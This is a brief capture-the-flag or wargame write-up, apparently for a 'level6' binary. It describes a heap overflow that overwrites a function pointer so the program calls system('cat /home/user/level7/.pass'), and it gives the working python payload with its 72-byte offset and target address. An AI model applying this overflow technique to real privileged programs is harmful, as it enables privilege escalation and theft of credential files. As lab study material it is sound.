level6 binary with the rights of level7

./level6 -> segfault
./level6 test -> Nope

main:
malloc 0x0804a008
malloc 0x0804a050
strcpy
call *%eax

m:
puts

n:
system

the system call is "cat /home/user/level7/.pass"

let's get to it by replacing the eax value

diff between the two malloc calls is 72, so this should be our offset
when testing with
./level6 `python -c 'print("a" * 74)'`
we do only modify the last two bytes of the eip
-> eip is changed because we jump to 2nd malloc value

we can simply input the address of n:
./level6 `python -c 'print("a" * 72 + "\x54\x84\x04\x08")'`
and get the .pass :-)
